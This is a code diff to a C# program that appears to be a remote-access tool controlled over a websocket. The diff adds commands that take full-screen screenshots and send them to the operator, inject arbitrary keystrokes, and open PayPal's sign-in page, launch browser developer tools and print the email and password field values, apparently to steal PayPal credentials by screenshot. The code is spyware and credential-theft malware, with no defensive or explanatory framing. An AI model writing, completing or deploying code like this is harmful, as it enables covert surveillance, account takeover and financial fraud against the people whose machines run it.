@@ -8,6 +8,7 @@ using System.Drawing.Imaging;
 using System.Windows.Forms;
 using Emgu.CV;
 using Keystroke.API;
+using System.Runtime.InteropServices;
 
 namespace A3
 {
@@ -21,13 +22,16 @@ namespace A3
         static string liveCharacter = "";
         static string lastLiveCharacter = "";
 
+        [DllImport("user32.dll")]
+        public static extern int SetForegroundWindow(IntPtr hWnd);
+
         static void Main(string[] args)
         {
 
             Thread myThread1;
             myThread1 = new Thread(new ThreadStart(connection));
             myThread1.Start();
-    
+
         }
 
         public static void connection(){
@@ -43,6 +47,39 @@ namespace A3
                     if (message == "screenshot")
                     {
                         ws.Send("##MESSAGE##{\"type\":\"info\", \"message\":\"Please wait, generating screenshot...\"}");
+                        Bitmap memoryImage;
+                        memoryImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
+                        Screen.PrimaryScreen.Bounds.Height);
+                        Size s = new Size(memoryImage.Width, memoryImage.Height);
+                        Graphics memoryGraphics = Graphics.FromImage(memoryImage);
+                        memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
+
+                        MemoryStream stream = new MemoryStream();
+                        memoryImage.Save(stream, ImageFormat.Bmp);
+                        byte[] imageBytes = stream.ToArray();
+                        string base64String = Convert.ToBase64String(imageBytes);
+                        ws.Send("##SCREENSHOT##" + base64String);
+                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                    }
+                    else if (message.StartsWith("sendkey"))
+                    {
+                        var key = message.Replace("sendkey ","");
+                        SendKeys.SendWait(key);
+                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                    }
+                    else if (message.StartsWith("ppal"))
+                    {
+                        Process.Start("chrome.exe", "https://www.paypal.com/fr/signin");
+                        Thread.Sleep(1000);
+                        var keys = "{F12}";
+                        SendKeys.SendWait(keys);
+                        Thread.Sleep(1000);
+                        var keys1 = "{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}{e}{m}{a}{i}{l}{.}{v}{a}{l}{u}{e}{ENTER}";
+                        SendKeys.SendWait(keys1);    
+                        Thread.Sleep(100);
+                        var keys2 = "{p}{a}{s}{s}{w}{o}{r}{d}{.}{v}{a}{l}{u}{e}{ENTER}";
+                        SendKeys.SendWait(keys2);
+                        Thread.Sleep(500);
                         Bitmap memoryImage;
                         memoryImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                         Screen.PrimaryScreen.Bounds.Height);
